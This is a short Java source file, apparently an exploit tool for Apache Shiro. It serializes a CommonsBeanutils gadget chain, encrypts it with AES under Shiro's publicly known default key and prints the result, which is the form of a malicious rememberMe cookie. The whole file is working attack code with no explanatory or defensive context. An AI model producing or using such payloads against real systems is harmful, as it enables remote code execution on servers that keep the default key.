package org.example.utils;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import org.example.gadget.shiro.ShiroCB1;

public class ShiroEncrypt {
    public static void main(String[] args) throws Exception {
        Object objcc6 = new ShiroCB1().getObject();
        byte[] objcc6byte = SerializationUtils.serialize(objcc6);
        AesCipherService aes = new AesCipherService();
        byte[] key =
                java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(objcc6byte, key);
        System.out.printf(ciphertext.toString());
    }
}
